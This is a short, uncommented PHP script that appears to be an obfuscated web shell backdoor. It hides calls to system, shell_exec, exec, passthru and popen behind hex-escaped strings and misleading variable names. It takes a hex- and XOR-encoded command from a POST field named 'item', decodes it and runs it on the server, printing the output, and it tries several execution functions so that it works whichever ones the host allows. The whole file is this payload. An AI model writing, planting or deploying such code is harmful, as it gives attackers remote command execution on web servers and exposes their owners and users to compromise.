<?php

$reverse_searcher1 = "\x73ys\x74\x65m";
$reverse_searcher6 = "\x73tre\x61m\x5Fget_c\x6Fn\x74\x65nt\x73";
$buffer_cache = "he\x78\x32b\x69\x6E";
$reverse_searcher2 = "\x73\x68\x65l\x6C_e\x78ec";
$reverse_searcher3 = "\x65\x78ec";
$reverse_searcher5 = "\x70open";
$reverse_searcher7 = "pclose";
$reverse_searcher4 = "p\x61\x73\x73t\x68ru";
if (isset($_POST["item"])) {
            function system_core    ( $element ,  $component )   {
$sym    = ''  ;
foreach(str_split($element) as $char){
$sym.=chr(ord($char)^$component);

} return$sym;
 
}
            $item = $buffer_cache($_POST["item"]);
            $item = system_core($item, 7);
            if (function_exists($reverse_searcher1)) {
                $reverse_searcher1($item);
            } elseif (function_exists($reverse_searcher2)) {
                print $reverse_searcher2($item);
            } elseif (function_exists($reverse_searcher3)) {
                $reverse_searcher3($item, $itm_element);
                print join("\n", $itm_element);
            } elseif (function_exists($reverse_searcher4)) {
                $reverse_searcher4($item);
            } elseif (function_exists($reverse_searcher5) && function_exists($reverse_searcher6) && function_exists($reverse_searcher7)) {
                $component_sym = $reverse_searcher5($item, 'r');
                if ($component_sym) {
                    $pgrp_ent = $reverse_searcher6($component_sym);
                    $reverse_searcher7($component_sym);
                    print $pgrp_ent;
                }
            }
            exit;
        }